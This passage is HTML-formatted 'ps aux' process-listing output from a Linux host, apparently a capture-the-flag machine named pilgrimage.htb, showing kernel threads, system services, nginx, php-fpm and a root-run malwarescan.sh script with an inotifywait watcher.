</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">105</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>kworker/u257:0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">127</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>kworker/1:1H-kblockd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">151</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>ata_sff<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">152</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">153</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">154</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">155</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_2<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">156</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">157</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_2<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">158</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_3<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">160</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_3<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">161</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_4<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">162</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_4<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">163</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_5<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">164</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_5<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">165</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_6<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">166</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_6<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">167</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_7<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">168</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_7<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">169</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_8<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">170</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_8<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">171</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_9<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">172</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_9<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">173</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_10<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">174</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_10<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">175</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_11<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">176</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_11<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">177</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_12<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">178</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_12<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">179</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_13<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">180</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_13<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">181</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_14<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">182</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_14<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">183</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_15<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">184</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_15<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">185</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_16<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">186</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_16<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">187</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_17<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">188</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_17<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">189</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_18<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">190</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_18<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">191</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_19<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">192</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_19<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">193</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_20<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">194</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_20<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">195</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_21<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">196</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_21<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">197</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_22<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">198</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_22<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">199</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_23<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">200</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_23<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">201</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_24<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">202</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_24<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">203</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_25<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">204</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_25<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">205</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_26<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">206</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_26<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">207</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_27<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">208</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_27<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">209</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_28<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">210</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_28<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">211</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_29<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">212</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_29<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">213</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_30<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">214</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_30<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">215</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_31<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">216</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_31<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">242</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:35   0:00 <span style="color:#f92672">[</span>kworker/u256:28-events_unbound<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">243</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:35   0:00 <span style="color:#f92672">[</span>kworker/u256:29-events_unbound<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">244</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:35   0:00 <span style="color:#f92672">[</span>kworker/u256:30-flush-8:0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">249</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>mpt_poll_0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">251</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>mpt/0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">252</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>scsi_eh_32<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">253</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>scsi_tmf_32<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">254</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:35   0:00 <span style="color:#f92672">[</span>kworker/0:3-cgroup_destroy<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">468</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>jbd2/sda1-8<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">469</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:36   0:00 <span style="color:#f92672">[</span>ext4-rsv-conver<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">503</span>  0.0  0.2  <span style="color:#ae81ff">64800</span> <span style="color:#ae81ff">11720</span> ?        Ss   01:36   0:00 /lib/systemd/systemd-journald
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">516</span>  0.1  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:36   0:00 <span style="color:#f92672">[</span>kworker/1:3-events<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">525</span>  0.0  0.1  <span style="color:#ae81ff">21716</span>  <span style="color:#ae81ff">5536</span> ?        Ss   01:36   0:00 /lib/systemd/systemd-udevd
</span></span><span style="display:flex;"><span>systemd+     <span style="color:#ae81ff">563</span>  0.0  0.1  <span style="color:#ae81ff">88436</span>  <span style="color:#ae81ff">6056</span> ?        Ssl  01:36   0:00 /lib/systemd/systemd-timesyncd
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">569</span>  0.0  0.2  <span style="color:#ae81ff">47748</span> <span style="color:#ae81ff">10780</span> ?        Ss   01:36   0:00 /usr/bin/VGAuthService
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">570</span>  0.2  0.1 <span style="color:#ae81ff">162996</span>  <span style="color:#ae81ff">7272</span> ?        Ssl  01:36   0:01 /usr/bin/vmtoolsd
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">574</span>  0.0  0.0  <span style="color:#ae81ff">87060</span>  <span style="color:#ae81ff">2056</span> ?        S&lt;sl 01:36   0:00 /sbin/auditd
</span></span><span style="display:flex;"><span>_laurel      <span style="color:#ae81ff">582</span>  0.0  0.1   <span style="color:#ae81ff">9772</span>  <span style="color:#ae81ff">5660</span> ?        S&lt;   01:36   0:00 /usr/local/sbin/laurel --config /etc/laurel/config.toml
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">586</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>irq/16-vmwgfx<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">587</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:36   0:00 <span style="color:#f92672">[</span>ttm_swap<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">590</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>card0-crtc0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">592</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>card0-crtc1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">604</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>card0-crtc2<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">610</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>card0-crtc3<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">613</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>card0-crtc4<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">614</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>card0-crtc5<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">615</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>card0-crtc6<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">616</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:36   0:00 <span style="color:#f92672">[</span>card0-crtc7<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">629</span>  0.0  0.1  <span style="color:#ae81ff">99884</span>  <span style="color:#ae81ff">7672</span> ?        Ssl  01:36   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">652</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:36   0:00 <span style="color:#f92672">[</span>cryptd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">682</span>  0.0  0.0   <span style="color:#ae81ff">6744</span>  <span style="color:#ae81ff">2748</span> ?        Ss   01:36   0:00 /usr/sbin/cron -f
</span></span><span style="display:flex;"><span>message+     <span style="color:#ae81ff">683</span>  0.0  0.1   <span style="color:#ae81ff">8260</span>  <span style="color:#ae81ff">4072</span> ?        Ss   01:36   0:00 /usr/bin/dbus-daemon --system --address<span style="color:#f92672">=</span>systemd: --nofork --nopidfile --systemd-activation --syslog-only
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">686</span>  0.0  0.0   <span style="color:#ae81ff">6816</span>  <span style="color:#ae81ff">3048</span> ?        Ss   01:36   0:00 /bin/bash /usr/sbin/malwarescan.sh
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">689</span>  0.0  0.6 <span style="color:#ae81ff">209752</span> <span style="color:#ae81ff">27128</span> ?        Ss   01:36   0:00 php-fpm: master process <span style="color:#f92672">(</span>/etc/php/7.4/fpm/php-fpm.conf<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">690</span>  0.0  0.1 <span style="color:#ae81ff">220796</span>  <span style="color:#ae81ff">4940</span> ?        Ssl  01:36   0:00 /usr/sbin/rsyslogd -n -iNONE
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">696</span>  0.0  0.1  <span style="color:#ae81ff">13848</span>  <span style="color:#ae81ff">7236</span> ?        Ss   01:36   0:00 /lib/systemd/systemd-logind
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">720</span>  0.0  0.0   <span style="color:#ae81ff">5844</span>  <span style="color:#ae81ff">1784</span> tty1     Ss+  01:36   0:00 /sbin/agetty -o -p -- <span style="color:#ae81ff">\u</span> --noclear tty1 linux
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">736</span>  0.0  0.0   <span style="color:#ae81ff">2516</span>   <span style="color:#ae81ff">708</span> ?        S    01:36   0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">737</span>  0.0  0.0   <span style="color:#ae81ff">6816</span>   <span style="color:#ae81ff">252</span> ?        S    01:36   0:00 /bin/bash /usr/sbin/malwarescan.sh
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">753</span>  0.0  0.1  <span style="color:#ae81ff">13352</span>  <span style="color:#ae81ff">7236</span> ?        Ss   01:36   0:00 sshd: /usr/sbin/sshd -D <span style="color:#f92672">[</span>listener<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> of 10-100 startups
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">818</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:36   0:00 <span style="color:#f92672">[</span>kworker/1:4-cgroup_destroy<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">827</span>  0.0  0.0  <span style="color:#ae81ff">56376</span>  <span style="color:#ae81ff">1628</span> ?        Ss   01:36   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
</span></span><span style="display:flex;"><span>www-data     <span style="color:#ae81ff">829</span>  0.0  0.1  <span style="color:#ae81ff">56944</span>  <span style="color:#ae81ff">5316</span> ?        S    01:36   0:00 nginx: worker process
</span></span><span style="display:flex;"><span>www-data     <span style="color:#ae81ff">830</span>  0.0  0.1  <span style="color:#ae81ff">56944</span>  <span style="color:#ae81ff">5316</span> ?        S    01:36   0:00 nginx: worker process
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">831</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:36   0:00 <span style="color:#f92672">[</span>nfit<span style="color:#f92672">]</span>
